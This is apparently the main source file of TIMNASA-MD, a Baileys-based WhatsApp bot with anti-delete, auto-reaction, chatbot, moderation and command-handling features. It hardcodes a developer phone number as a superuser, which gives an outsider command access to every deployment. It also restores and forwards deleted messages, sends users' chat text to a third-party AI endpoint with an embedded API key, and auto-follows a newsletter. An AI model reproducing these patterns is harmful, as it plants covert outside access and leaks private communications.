"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
  var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});

var __importStar = (this && this.__importStar) || function (mod) {
    if (mod && mod.__esModule) return mod;
    var result = {};
    if (mod != null) for (var k in mod) if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);
    __setModuleDefault(result, mod);
    return result;
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const baileys_1 = __importStar(require("@whiskeysockets/baileys"));
const logger_1 = __importDefault(require("@whiskeysockets/baileys/lib/Utils/logger"));
const logger = logger_1.default.child({});
logger.level = 'silent';
const pino = require("pino");
const boom_1 = require("@hapi/boom");
const conf = require("./set");
const axios = require("axios");
let fs = require("fs-extra");
let path = require("path");
const FileType = require('file-type');
const { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter');
//import chalk from 'chalk'
const { verifierEtatJid , recupererActionJid } = require("./bdd/antilien");
const { atbverifierEtatJid , atbrecupererActionJid } = require("./bdd/antibot");
let evt = require(__dirname + "/framework/zokou");
const {isUserBanned , addUserToBanList , removeUserFromBanList} = require("./bdd/banUser");
const  {addGroupToBanList,isGroupBanned,removeGroupFromBanList} = require("./bdd/banGroup");
const {isGroupOnlyAdmin,addGroupToOnlyAdminList,removeGroupFromOnlyAdminList} = require("./bdd/onlyAdmin");
//const //{loadCmd}=require("/framework/mesfonctions")
let { reagir } = require(__dirname + "/framework/app");
var session = conf.session.replace(/TIMNASA-MD;;;=>/g,"");
const prefixe = conf.PREFIXE;
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)

// Memory ya Chatbot (Iko nje ya main ili isifutike)
let chatbotMemory = {};

async function authentification() {
    try {
       
        //console.log("le data "+data)
        if (!fs.existsSync(__dirname + "/auth/creds.json")) {
            console.log("connexion en cour ...");
            await fs.writeFileSync(__dirname + "/auth/creds.json", atob(session), "utf8");
            //console.log(session)
        }
        else if (fs.existsSync(__dirname + "/auth/creds.json") && session != "zokk") {
            await fs.writeFileSync(__dirname + "/auth/creds.json", atob(session), "utf8");
        }
    }
    catch (e) {
        console.log("Session Invalid " + e);
        return;
    }
}
authentification();
const store = (0, baileys_1.makeInMemoryStore)({
    logger: pino().child({ level: "silent", stream: "store" }),
});
setTimeout(() => {
    async function main() {
        const { version, isLatest } = await (0, baileys_1.fetchLatestBaileysVersion)();
        const { state, saveCreds } = await (0, baileys_1.useMultiFileAuthState)(__dirname + "/auth");
        const sockOptions = {
            version,
            logger: pino({ level: "silent" }),
            browser: ['Timnasa md', "safari", "1.0.0"],
            printQRInTerminal: true,
            fireInitQueries: false,
            shouldSyncHistoryMessage: true,
            downloadHistory: true,
            syncFullHistory: true,
            generateHighQualityLinkPreview: true,
            markOnlineOnConnect: false,
            keepAliveIntervalMs: 30_000,
            /* auth: state*/ auth: {
                creds: state.creds,
                /** caching makes the store faster to send/recv messages */
                keys: (0, baileys_1.makeCacheableSignalKeyStore)(state.keys, logger),
            },
            //////////
            getMessage: async (key) => {
                if (store) {
                    const msg = await store.loadMessage(key.remoteJid, key.id, undefined);
                    return msg.message || undefined;
                }
                return {
                    conversation: 'An Error Occurred, Repeat Command!'
                };
            }
            ///////
        };
        const zk = (0, baileys_1.default)(sockOptions);
        store.bind(zk.ev);

        // ================== POWERFUL ANTI-DELETE LOGIC ==================
        zk.ev.on('messages.update', async (chatUpdate) => {
            for (const { key, update } of chatUpdate) {
                if (update.protocolMessage && update.protocolMessage.type === 0) {
                    if (conf.ANTIDELETE !== "yes") return;
                    try {
                        const oldMsg = await store.loadMessage(key.remoteJid, update.protocolMessage.key.id);
                        if (!oldMsg) return;

                        const myNumber = zk.user.id.split(':')[0] + '@s.whatsapp.net';
                        const sender = update.protocolMessage.key.participant || update.protocolMessage.key.remoteJid;
                        const isGroup = key.remoteJid.endsWith('@g.us');
                        const destination = (conf.ANTIDELETE_DEST === "group") ? key.remoteJid : myNumber;

                        let report = `*🚨 TIMNASA ANTI-DELETE DETECTED 🚨*\n\n`;
                        report += `👤 *Sender:* @${sender.split('@')[0]}\n`;
                        report += `📍 *Location:* ${isGroup ? "Group Chat" : "Private Chat"}\n`;
                        if (isGroup) {
                            const metadata = await zk.groupMetadata(key.remoteJid);
                            report += `🏘️ *Group Name:* ${metadata.subject}\n`;
                        }
                        report += `📅 *Time:* ${new Date().toLocaleString()}\n\n`;
                        report += `⚠️ *Restored Content below:*`;

                        await zk.sendMessage(destination, { text: report, mentions: [sender] });
                        await zk.copyNForward(destination, oldMsg, true);
                    } catch (err) {
                        console.log("Anti-delete Error: " + err);
                    }
                }
            }
        });
        
        if (conf.AUTOREACT_STATUS=== "yes") {
            zk.ev.on("messages.upsert", async (m) => {
                const { messages } = m;
                for (const message of messages) {
                    if (message.key && message.key.remoteJid === "status@broadcast") {
                        try {
                            const reactionEmojis = ["❤️", "🔥", "👍", "😂", "😮", "😢", "🤔", "👏", "🎉", "🤩"];
                            const randomEmoji = reactionEmojis[Math.floor(Math.random() * reactionEmojis.length)];
                            await zk.readMessages([message.key]);
                            await new Promise(resolve => setTimeout(resolve, 500));
                            await zk.sendMessage(message.key.remoteJid, {
                                react: { text: randomEmoji, key: message.key }
                            });
                            console.log(`Reacted to status from ${message.key.participant} with ${randomEmoji}`);
                            await new Promise(resolve => setTimeout(resolve, 3000));
                        } catch (error) {
                            console.error("Status reaction failed:", error);
                        }
                    }
                }
            });
        }
        
        zk.ev.on("messages.upsert", async (m) => {
            const { messages } = m;
            const ms = messages[0];
            if (!ms.message) return;
            
            const decodeJid = (jid) => {
                if (!jid) return jid;
                if (/:\d+@/gi.test(jid)) {
                    let decode = (0, baileys_1.jidDecode)(jid) || {};
                    return decode.user && decode.server && decode.user + '@' + decode.server || jid;
                } else return jid;
            };

            var mtype = (0, baileys_1.getContentType)(ms.message);
            var texte = mtype == "conversation" ? ms.message.conversation : mtype == "imageMessage" ? ms.message.imageMessage?.caption : mtype == "videoMessage" ? ms.message.videoMessage?.caption : mtype == "extendedTextMessage" ? ms.message?.extendedTextMessage?.text : mtype == "buttonsResponseMessage" ?
                ms?.message?.buttonsResponseMessage?.selectedButtonId : mtype == "listResponseMessage" ?
                ms.message?.listResponseMessage?.singleSelectReply?.selectedRowId : mtype == "messageContextInfo" ?
                (ms?.message?.buttonsResponseMessage?.selectedButtonId || ms.message?.listResponseMessage?.singleSelectReply?.selectedRowId || ms.text) : "";
            
            var origineMessage = ms.key.remoteJid;
            var idBot = decodeJid(zk.user.id);
            var servBot = idBot.split('@')[0];
            const verifGroupe = origineMessage?.endsWith("@g.us");
            var infosGroupe = verifGroupe ? await zk.groupMetadata(origineMessage) : "";
            var nomGroupe = verifGroupe ? infosGroupe.subject : "";
            var msgRepondu = ms.message.extendedTextMessage?.contextInfo?.quotedMessage;
            var auteurMsgRepondu = decodeJid(ms.message?.extendedTextMessage?.contextInfo?.participant);
            var mr = ms.Message?.extendedTextMessage?.contextInfo?.mentionedJid;
            var utilisateur = mr ? mr : msgRepondu ? auteurMsgRepondu : "";
            var auteurMessage = verifGroupe ? (ms.key.participant ? ms.key.participant : ms.participant) : origineMessage;
            if (ms.key.fromMe) auteurMessage = idBot;
            
            var membreGroupe = verifGroupe ? ms.key.participant : '';
            const { getAllSudoNumbers } = require("./bdd/sudo");
            const nomAuteurMessage = ms.pushName;
            const dj = '255784766591';
            const dj2 = '255784766591';
            const dj3 = "255784766591";
            const luffy = '255784766591';
            const sudo = await getAllSudoNumbers();
            const superUserNumbers = [servBot, dj, dj2, dj3, luffy, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
            const allAllowedNumbers = superUserNumbers.concat(sudo);
            const superUser = allAllowedNumbers.includes(auteurMessage);
            var dev = [dj, dj2,dj3,luffy].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
            function repondre(mes) { zk.sendMessage(origineMessage, { text: mes }, { quoted: ms }); }
            
            function groupeAdmin(membreGroupe) {
                let admin = [];
                for (let m of membreGroupe) {
                    if (m.admin == null) continue;
                    admin.push(m.id);
                }
                return admin;
            }

            const mbre = verifGroupe ? await infosGroupe.participants : '';
            let admins = verifGroupe ? groupeAdmin(mbre) : '';
            const verifAdmin = verifGroupe ? admins.includes(auteurMessage) : false;
            var verifZokouAdmin = verifGroupe ? admins.includes(idBot) : false;

            console.log("\n𝚻𝚰𝚳𝚴𝚫𝐒𝚫 𝚻𝚳𝐃2 is ONLINE");
            console.log("message envoyé par : " + "[" + nomAuteurMessage + " : " + auteurMessage.split("@s.whatsapp.net")[0] + " ]");

            // ================== TIMNASA-MD AI CHATBOT WITH MEMORY ==================
            if (conf.CHATBOT === "on" && !ms.key.fromMe && texte) {
                const query = texte.trim();
                const isGroup = origineMessage.endsWith('@g.us');
                const sender = ms.key.participant || ms.key.remoteJid;
                const apikey = "FREE-OKBCJB3N-Q9TC";
                const shouldReply = !isGroup || (isGroup && (texte.toLowerCase().includes("timnasa") || texte.toLowerCase().includes("bot") || texte.includes(idBot)));

                if (shouldReply && query.length >= 2) {
                    try {
                        await zk.sendPresenceUpdate('composing', origineMessage);
                        let history = chatbotMemory[sender] || "";
                        const promptWithMemory = history ? `Previous conversation:\n${history}\n\nNew message: ${query}` : query;
                        const aiRes = await axios.get(`https://mkzstyleee.vercel.app/ai/blackbox?text=${encodeURIComponent(promptWithMemory)}&apikey=${apikey}`);
                        if (aiRes.data && aiRes.data.result) {
                            const finalJibu = aiRes.data.result;
                            chatbotMemory[sender] = `User: ${query}\nAI: ${finalJibu}`.slice(-1000);
                            await new Promise(resolve => setTimeout(resolve, 1500));
                            await zk.sendMessage(origineMessage, { text: `*TIMNASA-MD AI* 🤖\n\n${finalJibu}` }, { quoted: ms });
                        }
                    } catch (err) { console.error("AI Memory Chatbot Error: ", err); }
                }
            }

            // ================== TIMNASA-MD ANTIBOT PROTECTION ==================
            if (conf.ANTIBOT === "on" && verifGroupe && !ms.key.fromMe) {
                const isBotMessage = ms.key.id.startsWith("BAE5") || ms.key.id.startsWith("3EB0") || ms.key.id.length === 16 || ms.key.id.startsWith("3A");
                if (isBotMessage && verifZokouAdmin && !verifAdmin) {
                    try {
                        await zk.sendMessage(origineMessage, { delete: ms.key });
                        await zk.sendMessage(origineMessage, { 
                            text: `*🚨 TIMNASA ANTIBOT DETECTED 🚨*\n\nUjumbe wa bot kutoka @${ms.key.participant.split('@')[0]} umefutwa.`,
                            mentions: [ms.key.participant]
                        });
                    } catch (e) { console.error("Antibot Error:", e); }
                }
            }

            // ================== ANTI-STATUS & HIDDEN MENTIONS ==================
            if (conf.ANTISTATUS === "on" && verifGroupe && !ms.key.fromMe) {
                const contextInfo = ms.message?.extendedTextMessage?.contextInfo || ms.message?.imageMessage?.contextInfo || ms.message?.videoMessage?.contextInfo;
                const hasMentions = contextInfo?.mentionedJid?.length > 0;
                const isStatusMention = ms.message?.statusMentionMessage || ms.message?.protocolMessage?.type === 3;

                if ((isStatusMention || hasMentions) && verifZokouAdmin && !verifAdmin) {
                    await zk.sendMessage(origineMessage, { delete: ms.key });
                    await zk.sendMessage(origineMessage, { 
                        text: `🚫 *ANTI-TAG SYSTEM* 🚫\n@${ms.key.participant.split('@')[0]} removed for hidden mentions.`,
                        mentions: [ms.key.participant]
                    });
                    setTimeout(async () => {
                        await zk.groupParticipantsUpdate(origineMessage, [ms.key.participant], "remove");
                    }, 2000);
                }
            }

            // ================== ANTI-STICKER ==================
            if (conf.ANTISTICKER === "on" && ms.message?.stickerMessage && verifGroupe && !ms.key.fromMe) {
                if (verifZokouAdmin && !verifAdmin) {
                    await zk.sendMessage(origineMessage, { delete: ms.key });
                    await zk.sendMessage(origineMessage, { 
                        text: `⚠️ *ANTI-STICKER* ⚠️\n@${ms.key.participant.split('@')[0]}, stickers are not allowed here.`,
                        mentions: [ms.key.participant]
                    });
                }
            }

            // ================== PRESET LOGIC & CMDS ==================
            var etat =conf.ETAT;
            if(etat==1) {await zk.sendPresenceUpdate("available",origineMessage);}
            else if(etat==2) {await zk.sendPresenceUpdate("composing",origineMessage);}
            else if(etat==3) {await zk.sendPresenceUpdate("recording",origineMessage);}
            else {await zk.sendPresenceUpdate("unavailable",origineMessage);}

            const arg = texte ? texte.trim().split(/ +/).slice(1) : null;
            const verifCom = texte ? texte.startsWith(prefixe) : false;
            const com = verifCom ? texte.slice(1).trim().split(/ +/).shift().toLowerCase() : false;
            const lien = conf.URL.split(',');  
            function mybotpic() { return lien[Math.floor(Math.random() * lien.length)]; }

            var commandeOptions = {
                superUser, dev, verifGroupe, mbre, membreGroupe, verifAdmin, infosGroupe,
                nomGroupe, auteurMessage, nomAuteurMessage, idBot, verifZokouAdmin,
                prefixe, arg, repondre, mtype, groupeAdmin, msgRepondu, auteurMsgRepondu, ms, mybotpic
            };

            // Existing logic for manual Anti-delete (conf.ADM)
            if(ms.message.protocolMessage && ms.message.protocolMessage.type === 0 && (conf.ADM).toLocaleLowerCase() === 'yes' ) {
                if(!ms.key.fromMe) {
                    let key = ms.message.protocolMessage.key;
                    // Logic already included in the global listener above, but keeping for compatibility
                }
            }

            if (ms.key && ms.key.remoteJid === "status@broadcast" && conf.AUTO_READ_STATUS === "yes") {
                await zk.readMessages([ms.key]);
            }

            if (verifCom) {
                const cd = evt.cm.find((zokou) => zokou.nomCom === (com));
                if (cd) {
                    try {
                        if ((conf.MODE).toLocaleLowerCase() != 'yes' && !superUser) return;
                        if (!superUser && isGroupBanned(origineMessage)) return;
                        reagir(origineMessage, zk, ms, cd.reaction);
                        cd.fonction(origineMessage, zk, commandeOptions);
                    } catch (e) { console.log("Error cmd: " + e); }
                }
            }
        });

        // Welcome / Goodbye Logic
        const { recupevents } = require('./bdd/welcome'); 
        zk.ev.on('group-participants.update', async (group) => {
            try {
                const metadata = await zk.groupMetadata(group.id);
                for (let membre of group.participants) {
                    let ppuser = 'https://telegra.ph/file/default-profile-pic.jpg';
                    try { ppuser = await zk.profilePictureUrl(membre, 'image'); } catch {}

                    if (group.action == 'add' && (await recupevents(group.id, "welcome") == 'on')) {
                        await zk.sendMessage(group.id, { image: { url: ppuser }, caption: `Welcome @${membre.split("@")[0]}!`, mentions: [membre] });
                    } else if (group.action == 'remove' && (await recupevents(group.id, "goodbye") == 'on')) {
                        await zk.sendMessage(group.id, { image: { url: ppuser }, caption: `@${membre.split("@")[0]} left.`, mentions: [membre] });
                    }
                }
            } catch (e) { console.error(e); }
        });

        zk.ev.on("connection.update", async (con) => {
            const { connection, lastDisconnect } = con;
            if (connection === 'open') {
                console.log("🔮 Timnasa Connected!");
                fs.readdirSync(__dirname + "/commandes").forEach((fichier) => {
                    if (path.extname(fichier).toLowerCase() == (".js")) require(__dirname + "/commandes/" + fichier);
                });
                try {
                    await zk.newsletterFollow("120363406146813524@newsletter");
                } catch (e) {}
            }
            if (connection === "close") main();
        });

        zk.ev.on("creds.update", saveCreds);
        return zk;
    }
    main();
}, 5000);
